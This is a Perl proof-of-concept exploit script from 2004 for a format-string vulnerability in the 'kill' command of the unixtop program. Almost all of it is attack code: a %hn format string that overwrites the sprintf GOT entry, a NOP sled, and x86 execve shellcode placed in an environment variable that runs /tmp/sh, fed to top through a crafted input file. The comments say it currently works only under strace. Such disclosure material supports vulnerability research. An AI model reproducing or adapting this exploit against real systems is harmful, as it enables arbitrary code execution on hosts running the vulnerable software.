#!/usr/bin/perl 
# PoC for DMA[2005-0103a].txt
# Copyright Kevin Finisterre
# 12/12/2004
# William LeFebvre - unixtop 'kill' format string
# Tested on Debian GNU/Linux 3.1 with top compiled from 
# top-3.5.tar.gz
#
# This currently DOES NOT work outside of strace. 
# /tmp/sh is run for the time being. 

# offsets definately vary within gdb, strace and just plain top
# this is probably due to the use of the env for our write address
$fmt = "%.49149d.%180\$hn.%.15825d.%181\$hn";  # offset within strace

# The length of shellcode affects the offset for our %x's
# Obviously this is because the env is used to store the write address
$sc = "\x90" x (511-45) . # subtract shellcode len

# 45 bytes by anthema. 0xff less
"\x89\xe6"     . #                     /* movl %esp, %esi          */
"\x83\xc6\x30" . #                     /* addl $0x30, %esi         */
#"\xb8\x2e\x62\x69\x6e" . # /bin      /* movl $0x6e69622e, %eax   */
"\xb8\x2e\x74\x6D\x70" . # /tmp        /* movl $0x6e69622e, %eax   */
"\x40"         . #                     /* incl %eax                */
"\x89\x06"     . #                     /* movl %eax, (%esi)        */
"\xb8\x2e\x73\x68\x21" . # /sh           /* movl $0x2168732e, %eax   */
"\x40"         . #                    /* incl %eax                */
"\x89\x46\x04" . #                    /* movl %eax, 0x04(%esi)    */
"\x29\xc0"     . #                    /* subl %eax, %eax          */
"\x88\x46\x07" . #                    /* movb %al, 0x07(%esi)     */
"\x89\x76\x08" . #                    /* movl %esi, 0x08(%esi)    */
"\x89\x46\x0c" . #                    /* movl %eax, 0x0c(%esi)    */
"\xb0\x0b"     . #                     /* movb $0x0b, %al          */
"\x87\xf3"     . #                     /* xchgl %esi, %ebx         */
"\x8d\x4b\x08" . #                     /* leal 0x08(%ebx), %ecx    */
"\x8d\x53\x0c" . #                      /* leal 0x0c(%ebx), %edx    */
"\xcd\x80"; #                          /* int $0x80                */

$topcmd = "k $fmt";  # Use the top kill command

# Lazy hack to pass input to top. 
# Write to file "ex" and feed to top via < 
open(FILEH, ">ex") or die "sorry can't write cmd file.\n";
print FILEH $topcmd;

# Clear out the environment.
# Thanks John!
foreach $key (keys %ENV) {

    delete $ENV{$key};

}
# Is the env *really* clear when we run system()? 

# sprintf() is called after the new_message() call so lets overwrite it
# 0804f340 R_386_JUMP_SLOT   sprintf
$addr1 = "\x42\xf3\x04\x08";
$addr2 = "\x40\xf3\x04\x08";

# Digital Munitions R0x your b0x. 
# set up some padding, insert write addresses and follow up with shellcode
$ENV{"DMR0x"} = "AZZZZZZZ$addr1$addr2$sc";
$ENV{"TERM"} = "linux";
$ENV{"PATH"} = "/usr/local/bin:/usr/bin:/bin";

# Run top and feed it the file "ex" which contains the malicious kill command
# This saves us from typing like we had to do with Seo's exploit 
$topexec = "cat ex | strace -i ./top";
system($topexec);
